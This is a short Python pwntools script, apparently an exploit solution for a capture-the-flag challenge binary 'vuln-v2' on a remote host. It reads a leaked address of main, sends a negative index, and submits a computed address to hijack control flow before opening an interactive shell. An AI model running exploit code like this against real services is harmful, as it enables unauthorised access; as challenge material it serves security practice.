from pwn import *

# io = process("./vuln-v2")
io = remote("spclr.ch", 1240)
io.recvuntil(b"am: ")
main = int(io.recvlineS(), 16)
io.sendlineafter(b"submit?", b"-2")
print(hex(main + 324))
io.sendlineafter(b"number:", str(main + 324).encode())
io.interactive()
